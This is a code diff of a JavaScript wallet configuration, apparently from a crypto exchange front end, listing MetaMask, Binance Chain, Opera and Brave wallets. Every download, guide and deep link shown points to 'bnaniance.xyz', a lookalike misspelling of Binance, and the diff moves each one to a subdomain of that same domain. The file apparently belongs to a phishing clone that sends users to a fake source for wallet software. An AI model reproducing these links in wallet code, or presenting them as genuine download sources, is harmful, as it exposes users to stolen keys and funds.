@@ -40,9 +40,9 @@ const walletsConfig = ({
       icon: '/images/wallets/metamask.png',
       installed: typeof window !== 'undefined' && Boolean(window.ethereum?.isMetaMask) && metaMaskConnector.ready,
       connectorId: ConnectorNames.MetaMask,
-      deepLink: 'http://bnaniance.xyz',
+      deepLink: 'http://a.bnaniance.xyz',
       qrCode,
-      downloadLink: 'http://bnaniance.xyz',
+      downloadLink: 'http://a.bnaniance.xyz',
     },
     {
       id: 'binance',
@@ -51,12 +51,12 @@ const walletsConfig = ({
       installed: typeof window !== 'undefined' && Boolean(window.BinanceChain),
       connectorId: ConnectorNames.BSC,
       guide: {
-        desktop: 'http://bnaniance.xyz',
+        desktop: 'http://a.bnaniance.xyz',
       },
       downloadLink: {
         desktop: isFirefox
-          ? 'http://bnaniance.xyz'
-          : 'http://bnaniance.xyz',
+          ? 'http://a.bnaniance.xyz'
+          : 'http://a.bnaniance.xyz',
       },
     },
     {
@@ -92,7 +92,7 @@ const walletsConfig = ({
       icon: '/images/wallets/opera.png',
       connectorId: ConnectorNames.Injected,
       installed: typeof window !== 'undefined' && Boolean(window.ethereum?.isOpera),
-      downloadLink: 'http://bnaniance.xyz',
+      downloadLink: 'http://a.bnaniance.xyz',
     },
     {
       id: 'brave',
@@ -100,7 +100,7 @@ const walletsConfig = ({
       icon: '/images/wallets/brave.png',
       connectorId: ConnectorNames.Injected,
       installed: typeof window !== 'undefined' && Boolean(window.ethereum?.isBraveWallet),
-      downloadLink: 'http://bnaniance.xyz',
+      downloadLink: 'http://a.bnaniance.xyz',
     },
     {
       id: 'math',
